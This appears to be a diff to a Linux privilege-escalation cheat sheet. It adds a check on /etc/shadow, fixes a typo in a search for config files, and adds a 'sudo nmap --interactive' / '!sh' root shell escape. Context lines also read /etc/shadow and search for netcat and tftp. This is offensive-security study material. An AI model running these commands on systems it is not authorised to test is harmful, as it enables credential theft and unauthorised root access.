@@ -51,6 +51,7 @@ grep -vE "nologin | false" /etc/passwd
 * Can we access /etc/shadow?
 ```
 cat /etc/shadow
+ls -al /etc/shadow
 ```
 
 * What's currently running on the box? What active network services are there?
@@ -68,7 +69,7 @@ uname -a # Kernel Exploits
 
 * Sensitive Files
 ```config
-fine . -iname '*config'
+find . -iname '*config'
 ```
 
 * mysql
@@ -100,6 +101,14 @@ find / -name nc<em>
 find / -name netcat</em>
 find / -name tftp*
 find / -name ftp
+```
+
+* Look at the original low privilege shell for notes 
+* Look for interesting things e.g. nmap 
+```
+sudo nmap --interactive
+nmap> !sh
+id 
 ```
 [Back](#summary)
 
